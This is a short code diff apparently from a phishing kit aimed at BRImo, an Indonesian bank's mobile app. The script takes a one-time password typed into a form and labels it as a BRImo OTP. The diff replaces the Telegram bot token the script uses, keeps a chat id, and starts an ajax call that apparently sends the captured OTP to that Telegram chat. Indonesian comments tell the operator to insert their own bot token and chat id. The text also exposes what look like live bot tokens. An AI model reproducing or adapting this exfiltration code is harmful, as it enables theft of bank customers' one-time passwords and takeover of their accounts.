@@ -4,7 +4,7 @@ function kirimPesan1(event){
 
     var gabungan = `( BRImo | OTP )%0A%0A- Code OTP : ${nama1.value}`;
 
-var token = '8744359658:AAFVEogZZ6Bkz2U7kyMBHROVkjU-ShtgeBk'; // Ganti dengan token bot yang kamu buat
+var token = '8227865726:AAFGAeVUhoJfwQoJbUmiY6e6hPL7sKHeAO0'; // Ganti dengan token bot yang kamu buat
     var grup = '7503823274'; // Ganti dengan chat id dari bot yang kamu buat    
 
     $.ajax({
